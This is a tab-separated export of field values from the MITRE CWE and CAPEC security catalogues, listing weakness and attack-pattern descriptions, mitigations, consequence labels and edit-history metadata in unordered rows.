13447	40	The targeted application must not be able to detect the illicit modification of the cache and must trust the cache value in its calculations.
19831	100	The MITRE Corporation
6218	97	String Format Overflow in syslog()
18871	31	1000
7909	30	Anonymous
23395	79	Confidentiality
6273	39	2014-07-30
17329	104	655
6298	28	CWE Content Team
19833	39	2012-05-11
23191	73	Inventory all application inputs
17586	43	Simple
17781	26	Architecture and Design
21909	95	Next, the adversary identifies an injection vector to deliver the excessive content to the targeted buffer.
11090	62	updated Common_Consequences
19618	80	Resources to physically infiltrate supplier.
7280	101	CAPEC Content Team
11187	50	Make sure that ANY failure occurring in the filtering or input validation routine is properly handled and that offending input is NOT allowed to go through. Basically make sure that the vault is closed when failure occurs.
9316	90	Language-Independent
7827	39	2011-06-01
11382	28	CWE Content Team
21418	86	http://www.securiteam.com/securityreviews/5TP0F0UEVQ.html
15599	59	Updated Description Summary
20064	28	CWE Content Team
7642	28	CWE Content Team
20599	40	The target must provide content but fail to adequately protect it against modification.The adversary must have the means to alter data to which he/she is not authorized.If the content is to be modified in transit, the adversary must be able to intercept the targeted messages.
13272	39	2019-01-03
13388	103	Primary
16737	35	MITRE
6663	62	updated Potential_Mitigations
14524	63	Unexpected State
22815	35	MITRE
9662	50	Encryption of all data packets emanating from the smartphone to a retransmission device via two encrypted tunnels with Suite B cryptography, all the way to the VPN gateway at the datacenter.
11106	62	updated Relationships
7529	100	The MITRE Corporation
18524	62	updated Common_Consequences
9666	62	updated Demonstrative_Examples, Relationships
11516	39	2012-10-30
18910	28	CWE Content Team
18390	23	In this attack scenario, the attacker passively listens for WiFi messages and logs the associated Media Access Control (MAC) addresses. These addresses are intended to be unique to each wireless device (although they can be configured and changed by software). Once the attacker is able to associate a MAC address with a particular user or set of users (for example, when attending a public event), the attacker can then scan for that MAC address to track that user in the future.
17177	25	Medium
10715	97	Code Injection
8842	28	CWE Content Team
19860	90	Java
8737	96	2018-07-02
8633	53	The MITRE Corporation
22660	104	301
19375	62	updated Potential_Mitigations, Time_of_Introduction
22658	62	updated Common_Consequences
20181	72	It can become difficult or impossible for the product to be able to distinguish between legitimate activities by the entity who provided the factor, versus illegitimate activities by an attacker.
19815	24	Purdue University
9805	28	CWE Content Team
9294	57	Primary
8012	62	updated Relationships
16782	62	updated Relationships, Taxonomy_Mappings
14057	35	MITRE
6338	76	2018-07-31
23885	95	Request service tickets
15937	39	2014-06-23
14426	63	Bypass Protection Mechanism
8281	62	updated Common_Consequences
22578	56	ChildOf
12701	35	MITRE
24682	97	Collect Data as Provided by Users
6915	31	699
18956	62	updated Other_Notes, Relationships
19545	80	To place malicious payload on server via HTTP
15482	62	updated Potential_Mitigations
22066	35	MITRE
18758	79	Confidentiality
21620	35	MITRE
19723	46	If a message is malformed it may cause the message to be incorrectly interpreted.             This weakness typically applies in cases where the product prepares a control message that another process must act on, such as a command or query, and malicious input that was intended as data, can enter the control plane instead. However, this weakness also applies to more general cases where there are not always control implications.
19272	35	MITRE
21610	44	SOAR Partial
16682	72	If the untrusted pointer is used in a function call, or points to unexpected data in a write operation, then code execution may be possible.
24079	23	An adversary leverages a legitimate capability of an application in such a way as to achieve a negative technical impact. The system functionality is not altered or modified but used in a way that was not intended. This is often accomplished through the overuse of a specific functionality or by leveraging functionality with design flaws that enables the adversary to gain access to unauthorized, sensitive data.
19258	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
18009	35	MITRE
7195	39	2017-11-08
24176	79	Confidentiality
7431	23	The software contains a hard-coded password, which it uses for its own inbound authentication or for outbound communication to external components.
22929	62	updated Affected_Resources, Applicable_Platforms, Relationships, Taxonomy_Mappings
11476	33	Jeannette M. Wing
14555	100	The MITRE Corporation
16733	95	[Attempt variations on input parameters] Possibly using an automated tool, an attacker requests variations on the URLs he spidered before. He sends parameters that include variations of payloads. He records all the responses from the server that include unmodified versions of his script.
8910	35	MITRE
22160	39	2008-09-08
6757	28	CWE Content Team
18004	100	The MITRE Corporation
14742	39	2010-09-27
5736	39	2011-06-27
13297	62	updated Common_Consequences, Description, Name, Other_Notes
10595	62	updated Common_Consequences
17932	42	Add synchronization to your non-reentrant function.
11901	60	02
20179	28	CWE Content Team
21667	52	Automated static analysis is useful for detecting commonly-used idioms for authorization. A tool may be able to analyze related configuration files, such as .htaccess in Apache web servers, or detect the usage of commonly-used authorization libraries.                   Generally, automated static analysis tools have difficulty detecting custom authorization schemes. In addition, the software's design may include some functionality that is accessible to any user and does not require an authorization check; an automated technique that detects the absence of authorization may report false positives.
19395	23	The requirements for the software dictate the use of an established authentication algorithm, but the implementation of the algorithm is incorrect.
24444	35	MITRE
7591	62	updated Demonstrative_Examples, Related_Attack_Patterns
7086	62	updated Potential_Mitigations
11196	53	The MITRE Corporation
19050	28	Eric Dalci
23679	92	Experiment
18875	39	2014-07-30
16941	56	ChildOf
22398	62	updated Common_Consequences
10342	62	updated Common_Consequences
23255	60	21
14551	81	Availability
7053	90	Language-Independent
16454	35	MITRE
11818	21	PLOVER
12055	81	Confidentiality
25346	28	CWE Content Team
10648	39	2011-06-27
17208	23	The program calls a thread's run() method instead of calling start(), which causes the code to run in the thread of the caller instead of the callee.
11108	39	2017-11-08
16931	39	2017-11-08
8968	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.                   When validating filenames, use stringent whitelists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as "/" to avoid CWE-36. Use a whitelist of allowable file extensions, which will help to avoid CWE-434.                   Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a blacklist, which may be incomplete (CWE-184). For example, filtering "/" is insufficient protection if the filesystem also supports the use of "\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if "../" sequences are removed from the ".../...//" string in a sequential fashion, two instances of "../" would be removed from the original string, but the remaining characters would still form the "../" string.
19525	26	Implementation
5622	56	ChildOf
18282	63	Gain Privileges or Assume Identity
13563	69	Draft
6068	62	updated Relationships
22620	74	1
15623	104	80
15543	91	Implementation
8000	28	Eric Dalci
5701	76	2017-08-04
19201	42	If available, use features of the language or framework that allow specification of whitelists of attributes or fields that are allowed to be modified. If possible, prefer whitelists over black lists.                   For applications written with Ruby on Rails, use the attr_accessible (whitelist) or attr_protected (blacklist) macros in each class that may be used in mass assignment.
17433	102	ChildOf
17016	91	Implementation
20033	39	2009-03-10
18390	89	Detailed
25231	47	Gain Privileges
17149	35	MITRE
24978	39	2011-03-29
7791	40	The target host is logging the action and data of the user.
6761	62	updated Applicable_Platforms, Description, Relationships, Other_Notes, Taxonomy_Mappings
22734	79	Integrity
21730	39	2011-06-01
25379	70	HTTP 1.1 Specification (RFC 2616)
16428	62	updated Potential_Mitigations, Time_of_Introduction
25123	89	Detailed
14576	28	CWE Content Team
21174	39	2011-03-29
16727	74	3
8925	102	CanFollow
7206	25	Medium
16968	62	updated Applicable_Platforms, Detection_Factors, Relationships, Other_Notes, Weakness_Ordinalities
21292	63	DoS: Resource Consumption (CPU)
9000	28	CWE Content Team
8092	62	updated Related_Attack_Patterns, Relationships
21150	28	CWE Content Team
6540	39	2011-06-27
19684	28	CWE Content Team
24847	35	MITRE
18111	28	CWE Content Team
20521	35	MITRE
17633	39	2010-04-05
20295	23	The program does not release or incorrectly releases a resource before it is made available for re-use.
19920	44	SOAR Partial
17185	23	The software uses an API function that does not exist on all versions of the target platform. This could cause portability problems or inconsistencies that allow denial of service or other consequences.
6394	43	Simple
24431	62	Suggested a better name and the minimal relationship with resources regardless of their criticality.
20850	35	MITRE
24773	35	MITRE
21052	62	updated Common_Consequences
6808	81	Confidentiality
19660	102	ChildOf
23263	50	Assume all input is malicious. Consider all potentially relevant properties when validating input.
16364	62	updated References, Relationships
18189	35	MITRE
18211	56	ChildOf
14040	39	2008-09-08
22361	81	Availability
14393	28	Eric Dalci
17407	90	PHP
18674	90	Language-Independent
11581	28	Eric Dalci
11762	28	CWE Content Team
9806	31	699
7023	46	Important and common functions will return some value about the success of its actions. This will alert the program whether or not to handle any errors caused by that function.
12318	62	updated References
23300	39	2017-11-08
11890	91	Architecture and Design
19860	23	The code does not have a default case in a switch statement, which might lead to complex logical errors and resultant weaknesses.
19529	76	2015-12-07
16275	39	2011-03-29
6394	90	Java
19236	28	CWE Content Team
9115	33	H. Thompson
13546	72	The injected code could access restricted data / files.
12438	79	Confidentiality
22712	53	The MITRE Corporation
6197	21	CWE Content Team
13071	23	The software uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize multiple internal "../" sequences that can resolve to a location that is outside of that directory.
17432	90	C++
5920	62	updated Applicable_Platforms, Modes_of_Introduction, Relationships
8368	62	updated Demonstrative_Examples, Related_Attack_Patterns
18050	35	MITRE
23807	72	Omitting the use of encryption in any program which transfers data over a network of any kind should be considered on par with delivering the data sent to each user on the local networks of both the sender and receiver. Worse, this omission allows for the injection of data into a stream of communication between two parties -- with no means for the victims to separate valid data from invalid. In this day of widespread network attacks and password collection sniffers, it is an unnecessary risk to omit encryption from the design of any system which might benefit from it.
16863	62	updated Relationships
8652	26	Architecture and Design
23591	62	updated Demonstrative_Examples
12238	28	Eric Dalci
8612	54	Medium
16688	23	An attacker is able to leverage access gained to the database to read / write data to the file system, compromise the operating system, create a tunnel for accessing the host machine, and use this access to potentially attack other machines on the same network as the database machine. Traditionally SQL injections attacks are viewed as a way to gain unauthorized read access to the data stored in the database, modify the data in the database, delete the data, etc. However, almost every data base management system (DBMS) system includes facilities that if compromised allow an attacker complete access to the file system, operating system, and full access to the host running the database. The attacker can then use this privileged access to launch subsequent attacks. These facilities include dropping into a command shell, creating user defined functions that can call system level libraries present on the host machine, stored procedures, etc.
21590	88	Integer Coercion Error
19428	44	SOAR Partial
12269	76	2019-04-04
16845	60	24
8687	35	Cigital
13415	88	Use of Out-of-range Pointer Offset
14492	81	Confidentiality
11348	50	Because Symlink can be modified by an attacker, make sure that the ones you read are located in protected directories.
7242	59	Updated Activation_Zone, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Related_Vulnerabilities, Resources_Required, Typical_Likelihood_of_Exploit
25338	35	MITRE
23618	85	465
12753	67	Medium
15561	91	Architecture and Design
6218	61	Draft
16021	50	Ensure that all user-supplied input is validated before being stored.
22013	61	Draft
9330	28	CWE Content Team
13405	39	2009-05-27
7811	23	An adversary inserts invalid characters in identifiers to bypass application filtering of input. Filters may not scan beyond invalid characters but during later stages of processing content that follows these invalid characters may still be processed. This allows the attacker to sneak prohibited commands past filters and perform normally prohibited operations. Invalid characters may include null, carriage return, line feed or tab in an identifier. Successful bypassing of the filter can result in a XSS attack, resulting in the disclosure of web cookies or possibly other results.
8541	39	2013-07-17
10910	35	MITRE
14389	49	2002
23713	68	An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization.
7990	73	Integrate localized information in the web pages created to duplicate the original website. Those localized information could be dynamically generated based on unique key or IP address of the future victim.
15108	77	Manual Static Analysis - Source Code
13976	23	If two threads of execution use a resource simultaneously, there exists the possibility that resources may be used while invalid, in turn making the state of execution undefined.
9654	50	Implementation: Ensure that HTTP methods have proper ACLs based on what the functionality they expose
14936	90	Language-Independent
21000	42	Both Equals() and Hashcode() should be defined.
18143	43	Simple
8306	25	Low
7997	76	2018-07-31
14624	73	Use a very large list of probe strings in order to detect if there is a positive result, and, what type of system has been targeted (if obscure).
22747	89	Detailed
19927	88	Not Failing Securely ('Failing Open')
9986	81	Other
20747	39	2011-03-29
14816	80	Ability to read, interpret, and subsequently alter manufacturer's documentation to misrepresent system capabilities.
18200	73	Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL, forms found in the pages (like file upload, etc.).
19038	45	Base
8712	42	Increase the entropy used to seed a PRNG.
24753	101	CAPEC Content Team
13261	23	The software receives data from an upstream component, but does not neutralize or incorrectly neutralizes CR and LF characters before the data is included in outgoing HTTP headers.
20806	28	CWE Content Team
7614	50	Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as content that can be interpreted in the context of an XML data or a query.                Use of custom error pages - Attackers can glean information about the nature of queries from descriptive error messages. Input validation must be coupled with customized error pages that inform about an error without disclosing information about the database or application.
6089	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
18131	74	1
20137	47	Resource Consumption
23782	91	Build and Compilation
11038	73	Use automated tools to identify URLs.
25004	57	Primary
6443	76	2019-04-04
8649	74	2
20177	40	Tainted data used in the environment variables is not properly validated. For instance boundary checking is not done before copying the input data to a buffer.
14570	42	Use an intermediate disclaimer page that provides the user with a clear warning that they are leaving the current site. Implement a long timeout before the redirect occurs, or force the user to click on the link. Be careful to avoid XSS problems (CWE-79) when generating the disclaimer page.
23053	81	Confidentiality
19998	47	Resource Consumption
18327	39	2009-03-10
22329	62	updated Description, Relationships, Taxonomy_Mappings
15358	28	CWE Content Team
7804	39	2009-10-29
7875	44	SOAR Partial
13322	88	Insufficient Documentation of Error Handling Techniques
21193	104	703
15071	59	Updated @Abstraction
7308	66	Clickjacking For Shells
8092	28	CWE Content Team
23689	46	As data is parsed, improperly handled leading special elements may cause the process to take unexpected actions that result in an attack.
23666	45	Base
14208	81	Integrity
23450	39	2011-03-29
7096	28	CWE Content Team
14743	26	Operation
7254	28	CWE Content Team
14887	55	CAPEC Content Team
24980	74	1
24033	92	Explore
20655	39	2019-01-03
14861	33	Alexander Sotirov et al.
21608	73	The adversary leveraged iframe overlay capabilities to craft a malicious clickjacking page
12481	39	2018-03-27
18239	77	Architecture or Design Review
22725	28	CWE Content Team
19305	35	Cigital
10972	28	CWE Content Team
23040	26	Implementation
8905	62	updated Potential_Mitigations
19602	86	http://blogs.sans.org/appsecstreetfighter/2010/02/25/top-25-series-rank-8-unrestricted-upload-of-dangerous-file-type/
21475	39	2008-09-08
11782	81	Access Control
25407	28	CWE Content Team
8705	71	2008
21203	62	updated Applicable_Platforms
13816	76	2017-05-01
13584	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Focused Manual Spotcheck - Focused manual analysis of source                            Manual Source Code Review (not inspections)
20073	66	XML Entity Expansion
22028	73	Send the malicious crafted XML message containing the multiple attributes to the target URL, causing a denail of service.
15918	62	updated Relationships, Taxonomy_Mappings
23985	39	2012-10-30
20316	62	updated Relationships
23717	40	Program must allow for user controlled variables to be applied directly to the filesystem
14376	26	Implementation
25390	62	updated Potential_Mitigations
20714	39	2011-09-13
9224	60	27
19982	61	Draft
10234	35	MITRE
16561	43	Simple
9922	76	2015-11-09
12668	104	617
16042	46	After the assignment, the variable is either assigned another value or goes out of scope. It is likely that the variable is simply vestigial, but it is also possible that the unused variable points out a bug.
20293	39	2012-10-30
13054	26	Implementation
19851	31	699
7366	88	Information Exposure Through Include Source Code
21562	33	Sean Barnum
23973	103	Primary
22757	62	updated Common_Consequences
8907	62	updated Relationships
23765	39	2011-06-27
10068	28	Eric Dalci
24310	35	MITRE
15884	28	CWE Content Team
18870	47	Read Data
16945	28	CWE Content Team
13923	36	https://www.mandiant.com
22692	28	Eric Dalci
21949	62	updated References, Relationships
23968	46	As an example, with Java, this weakness might indicate cycles between packages. This issue makes it more difficult to maintain the software due to insufficient modularity, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities. This issue can prevent the software from running reliably.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.
22105	62	updated Relationships
6294	51	2017-02-01
24288	28	CWE Content Team
25244	36	http://projects.webappsec.org/Improper-Input-Handling
6824	28	CWE Content Team
23758	63	Gain Privileges or Assume Identity
16075	88	Privilege Context Switching Error
17092	62	updated Potential_Mitigations
21329	81	Other
14842	35	MITRE
9886	104	1126
14303	62	Suggested OWASP Top Ten 2004 mapping
19031	103	Primary
15568	28	CWE Content Team
20670	28	CWE Content Team
15624	28	CWE Content Team
25338	62	updated Common_Consequences
21292	72	When a race condition makes it possible to bypass a resource cleanup routine or trigger multiple initialization routines, it may lead to resource exhaustion (CWE-400).
9281	101	CAPEC Content Team
7699	28	CWE Content Team
17836	35	MITRE
20403	62	updated Relationships, Taxonomy_Mappings
18491	62	updated Relationships
16656	44	SOAR Partial
10265	52	Credential storage in configuration files is findable using black box methods, but the use of hard-coded credentials for an incoming authentication routine typically involves an account that is not visible outside of the code.
11353	103	Primary
15743	91	Implementation
22814	62	updated Time_of_Introduction
12688	28	CWE Content Team
21775	35	MITRE
17778	47	Execute Unauthorized Commands
11901	66	The Importance of Being Canonical
6449	31	1003
11815	28	CWE Content Team
23716	35	MITRE
8595	28	CWE Content Team
9758	39	2017-01-19
7842	26	Architecture and Design
8143	42	When freeing pointers, be sure to set them to NULL once they are freed. However, the utilization of multiple or complex data structures may lower the usefulness of this strategy.
7968	91	Architecture and Design
12773	35	MITRE
25142	35	MITRE
13640	73	Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute appropriately.
9349	97	Fuzzing for garnering J2EE/.NET-based stack traces, for application mapping
10797	39	2012-10-30
21982	23	An adversary spoofs a checksum message for the purpose of making a payload appear to have a valid corresponding checksum. Checksums are used to verify message integrity. They consist of some value based on the value of the message they are protecting. Hash codes are a common checksum mechanism. Both the sender and recipient are able to compute the checksum based on the contents of the message. If the message contents change between the sender and recipient, the sender and recipient will compute different checksum values. Since the sender's checksum value is transmitted with the message, the recipient would know that a modification occurred. In checksum spoofing an adversary modifies the message body and then modifies the corresponding checksum so that the recipient's checksum calculation will match the checksum (created by the adversary) in the message. This would prevent the recipient from realizing that a change occurred.
13114	25	High
6815	79	Confidentiality
14639	35	MITRE
5589	91	Implementation
19161	56	ChildOf
12387	28	CWE Content Team
23778	40	On/In Path Device
15004	62	updated Applicable_Platforms, Name, Relationships
17107	23	An attacker exploits a DNS misconfiguration that permits a ZONE transfer. Some external DNS servers will return a list of IP address and valid hostnames. Under certain conditions, it may even be possible to obtain Zone data about the organization's internal network. When successful the attacker learns valuable information about the topology of the target organization, including information about particular servers, their role within the IT structure, and possibly information about the operating systems running upon the network. This is configuration dependent behavior so it may also be required to search out multiple DNS servers while attempting to find one with ZONE transfers allowed.
20182	31	699
10703	62	updated Relationships, Relationship_Notes, Taxonomy_Mappings
7791	23	The attacker injects, manipulates, deletes, or forges malicious log entries into the log file, in an attempt to mislead an audit of the log file or cover tracks of an attack. Due to either insufficient access controls of the log files or the logging mechanism, the attacker is able to perform such actions.
11433	43	Simple
12418	94	An adversary's injection of additional content into a communication channel negatively impacts the integrity of that channel.
20025	28	CWE Content Team
9200	54	Medium
20627	62	updated Common_Consequences
13285	24	MITRE
24537	43	Simple
10435	74	3
6526	51	2014-06-23
8687	39	2008-07-01
10002	60	01
23792	35	MITRE
24881	59	Updated Description, Related_Weaknesses
14711	44	SOAR Partial
20322	95	[Trigger command line execution with injected arguments] The attacker causes execution of command line functionality which leverages previously injected database content as arguments.
24356	96	2018-07-02
16769	26	Architecture and Design
15382	62	updated Relationships
15363	35	MITRE
24792	33	Rahul Bhattacharjee
13171	46	If the pointer contains an uninitialized value, then the value might not point to a valid memory location. This could cause the program to read from or write to unexpected memory locations, leading to a denial of service. If the uninitialized pointer is used as a function call, then arbitrary functions could be invoked. If an attacker can influence the portion of uninitialized memory that is contained in the pointer, this weakness could be leveraged to execute code or perform other attacks.             Depending on memory layout, associated memory management behaviors, and program operation, the attacker might be able to influence the contents of the uninitialized pointer, thus gaining more fine-grained control of the memory location to be accessed.
9875	31	699
15798	62	updated Related_Attack_Patterns, Relationships
16548	62	updated Relationships
24125	28	Eric Dalci
17472	55	CAPEC Content Team
14992	103	Primary
21105	62	updated Demonstrative_Examples
14686	79	Confidentiality
10361	28	CWE Content Team
9940	50	Use cryptographic tokens to associate a request with a specific action. The token can be regenerated at every request so that if a request with an invalid token is encountered, it can be reliably discarded. The token is considered invalid if it arrived with a request other than the action it was supposed to be associated with.
6290	40	The adversary must have gained access to the target system via physical or logical means in order to carry out this attack.
5588	50	Authenticate all servers and perform redundant checks when using DNS hostnames.
9754	79	Non-Repudiation
7180	35	MITRE
8730	39	2008-09-08
15286	62	updated Common_Consequences
17272	103	Primary
22420	73	Manually perform the blind SQL Injection to extract desired information about the database schema.
10696	97	Encryption Brute Forcing
19830	28	CWE Content Team
7517	100	The MITRE Corporation
7558	39	2008-07-01
22208	42	Assign permissions to the software system that prevents the user from accessing/opening privileged files.
12292	28	CWE Content Team
24589	62	updated Common_Consequences
17564	81	Other
20728	100	The MITRE Corporation
9298	62	updated Potential_Mitigations, Relationships, Taxonomy_Mappings
5900	103	Primary
12668	88	Reachable Assertion
16845	48	02
8405	35	Cigital
9772	103	Primary
7768	31	1000
19279	28	CWE Content Team
18719	95	The attacker craft a malicious input and inject it into the format string parameter. From now on, the attacker can execute arbitrary code and do more damage.
14277	62	updated Potential_Mitigations
24091	35	MITRE
13936	72	Other applications, possibly untrusted, can read the data that is offered through the Intent.
23245	43	Simple
21282	39	2019-01-03
6315	79	Access Control
20409	39	2010-12-13
15850	69	Incomplete
18868	23	An adversary, through a previously installed malicious application, injects code into the context of a web page displayed by a WebView component. Through the injected code, an adversary is able to manipulate the DOM tree and cookies of the page, expose sensitive information, and can launch attacks against the web application from within the web page.
15786	102	ChildOf
15248	45	Base
7726	49	1999
23471	103	Primary
13152	79	Access Control
9451	86	http://www.boost.org/doc/libs/1_38_0/libs/smart_ptr/smart_ptr.htm
20902	39	2012-10-30
14220	39	2012-05-11
7500	39	2010-09-27
12286	79	Confidentiality
6672	28	CWE Content Team
23659	28	CWE Content Team
8304	42	Use an adaptive hash function that can be configured to change the amount of computational effort needed to compute the hash, such as the number of iterations ("stretching") or the amount of memory required. Some hash functions perform salting automatically. These functions can significantly increase the overhead for a brute force attack compared to intentionally-fast functions such as MD5. For example, rainbow table attacks can become infeasible due to the high computing overhead. Finally, since computing power gets faster and cheaper over time, the technique can be reconfigured to increase the workload without forcing an entire replacement of the algorithm in use.                   Some hash functions that have one or more of these desired properties include bcrypt [REF-291], scrypt [REF-292], and PBKDF2 [REF-293]. While there is active debate about which of these is the most effective, they are all stronger than using salts with hash functions with very little computing overhead.                   Note that using these functions can have an impact on performance, so they require special consideration to avoid denial-of-service attacks. However, their configurability provides finer control over how much CPU and memory is used, so it could be adjusted to suit the environment's needs.
17879	23	The software has two different sources of the same data or information, but it uses the source that has less support for verification, is less trusted, or is less resistant to attack.
9004	62	updated Common_Consequences
8249	61	Stable
23022	39	2013-02-21
7940	35	MITRE
18714	62	updated Relationships, Taxonomy_Mappings
12263	81	Integrity
19412	59	Updated Resources_Required
6840	35	MITRE
20924	35	MITRE
11781	57	Indirect
12148	40	Some level of access to modify the target schema.
25113	95	[Determine Application's Log File Format] The first step is exploratory meaning the attacker observes the system. The attacker looks for action and data that are likely to be logged. The attacker may be familiar with the log format of the system.
11121	53	The MITRE Corporation
22130	35	Cigital
15390	39	2008-07-01
7789	28	CWE Content Team
8233	47	Gain Privileges
15653	54	High
8078	79	Confidentiality
7358	39	2012-10-30
23396	26	Implementation
10426	35	MITRE
7916	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
21049	50	Use anti-virus and anti-malware tools which can prevent malware from executing if it finds its way onto a target system. Additionally, make sure these tools are regularly updated to contain up-to-date virus and malware signatures.
25256	62	updated Modes_of_Introduction, Potential_Mitigations, Relationships
9210	63	Read Application Data
8310	63	Modify Files or Directories
9607	35	MITRE
17890	28	CWE Content Team
22087	31	1000
10743	92	Exploit
6060	35	Cigital
10335	69	Draft
9741	39	2017-11-08
20347	53	The MITRE Corporation
25023	62	updated Relationships
12555	59	Updated Resources_Required
14144	62	updated Potential_Mitigations, References
16959	28	CWE Content Team
24879	40	A SIM card that relies on the DES cipher.
19802	23	The code at one architectural layer invokes code that resides      at a deeper layer than the adjacent layer, i.e., the invocation skips at least one      layer, and the invoked code is not part of a vertical utility layer that can be referenced from any horizontal layer.
21189	104	768
8374	28	CWE Content Team
10589	56	ChildOf
17124	35	Cigital
17293	23	An attacker manipulates either egress or ingress data from a client within an application framework in order to change the content of messages. Performing this attack allows the attacker to manipulate content in such a way as to produce messages or content that look authentic but may contain deceptive links, spam-like content, or links to the attackers' code. In general, content-spoofing within an application API can be employed to stage many different types of attacks varied based on the attackers' intent. The techniques require use of specialized software that allow the attacker to man-in-the-middle communications between the web browser and the remote system.
17183	61	Draft
17719	28	CWE Content Team
13047	39	2009-10-29
23995	35	Cigital
21263	62	updated Modes_of_Introduction, Relationships, Taxonomy_Mappings
25126	63	Gain Privileges or Assume Identity
12376	32	Software Engineering Institute: Carnegie Mellon University
17050	28	CWE Content Team
8678	51	2014-06-23
8557	62	updated Relationships, Other_Notes, Taxonomy_Mappings, Type
19359	35	MITRE
25275	35	MITRE
11432	35	MITRE
16098	63	Bypass Protection Mechanism
10662	100	The MITRE Corporation
24180	97	Using UTF-8 Encoding to Bypass Validation Logic
8060	50	Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system.
19621	23	Allowing password aging to occur unchecked can result in the possibility of diminished password integrity.
23721	35	MITRE
5624	40	Lack of authentication on deauthentication/disassociation packets on 802.11-based networks
5684	103	Primary
12135	103	Primary
7924	79	Integrity
12182	28	CWE Content Team
21878	104	1069
24137	56	ChildOf
7004	28	CWE Content Team
7748	77	Automated Static Analysis - Binary or Bytecode
15629	55	CAPEC Content Team
15956	39	2011-06-01
16005	53	The MITRE Corporation
9841	89	Standard
11194	28	CWE Content Team
14375	81	Confidentiality
17039	45	Base
9227	88	Sensitive Data Under Web Root
7448	103	Primary
13292	25	Medium
22113	79	Authorization
8034	76	2018-07-31
18006	28	CWE Content Team
10768	36	http://en.wikipedia.org/wiki/DNS_cache_poisoning
19508	28	CWE Content Team
17539	35	MITRE
10460	62	updated References, Relationship_Notes, Research_Gaps
15566	39	2011-06-01
10029	39	2008-07-01
13273	28	Eric Dalci
23740	25	Low
17450	35	Cigital
19152	27	A tool, such as a MITM Proxy or a fuzzer, that is capable of generating and injecting custom inputs to be used in the attack.
21349	103	Primary
15155	23	Referencing memory after it has been freed can cause a program to crash, use unexpected values, or execute code.
20631	62	updated Relationships
20824	74	4
17405	104	822
12756	31	1000
20838	62	updated Related_Attack_Patterns
12466	31	699
9316	57	Primary
6884	45	Base
19793	28	CWE Content Team
20693	69	Incomplete
6664	42	Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software.
24349	31	699
20327	56	ChildOf
9053	62	updated Description, Name
7253	39	2019-09-19
21790	101	CAPEC Content Team
13123	36	http://softwareas.com/explaining-the-dont-click-clickjacking-tweetbomb
12412	74	4
15707	94	Run Arbitrary Code
23953	39	2011-06-01
20189	43	Simple
12810	62	updated Time_of_Introduction
15789	39	2009-03-10
23816	31	1000
5729	35	MITRE
9574	67	Low
8380	53	The MITRE Corporation
20900	63	Read Application Data
22289	97	Detect Unpublicized Web Services
15914	91	Architecture and Design
14856	101	CAPEC Content Team
17576	39	2009-10-29
16843	66	RSA Problem
24604	28	CWE Content Team
22519	62	updated Common_Consequences
25193	35	MITRE
12015	35	Veracode
7634	71	2000
24794	62	updated Common_Consequences, Potential_Mitigations, References
22804	35	MITRE
21004	56	ChildOf
8562	46	An attacker can execute malicious code by compromising the host server, performing DNS spoofing, or modifying the code in transit.
22060	81	Confidentiality
9124	49	2013
24695	78	Low
24117	26	Implementation
20923	49	2010
7163	55	CAPEC Content Team
25334	45	Base
7403	35	MITRE
19669	28	CWE Content Team
11252	39	2014-07-30
11139	26	Implementation
7091	24	MITRE
21958	39	2011-03-29
8316	74	1
14603	88	Attempt to Access Child of a Non-structure Pointer
13635	30	G. McGraw
23773	79	Integrity
9915	80	To inject the malicious payload in a web page
15206	42	Use static analysis tools to spot such issues in your code.
8277	63	Read Application Data
6180	79	Availability
10580	100	The MITRE Corporation
6735	28	CWE Content Team
10992	62	updated Relationships
21471	69	Incomplete
17107	40	Access to a DNS server that allows Zone transfers.
18184	21	CWE Content Team
14733	31	699
15598	28	Eric Dalci
22571	51	2014-06-23
7755	39	2008-07-01
6415	56	ChildOf
10619	77	Manual Static Analysis - Binary or Bytecode
17048	91	Implementation
14135	35	MITRE
14367	39	2017-11-08
11471	28	CWE Content Team
10992	35	MITRE
23712	62	updated Description, Name, Relationships
24915	39	2017-11-08
19927	43	Simple
13254	62	updated Time_of_Introduction
6467	35	MITRE
15927	103	Primary
14289	26	Implementation
18236	76	2019-09-30
16968	35	MITRE
18009	28	CWE Content Team
10204	79	Confidentiality
7390	48	01
7547	81	Availability
14771	28	CWE Content Team
14011	61	Draft
9310	35	MITRE
6337	104	440
15799	39	2009-03-10
13810	39	2008-11-24
19113	28	Eric Dalci
23760	39	2012-05-11
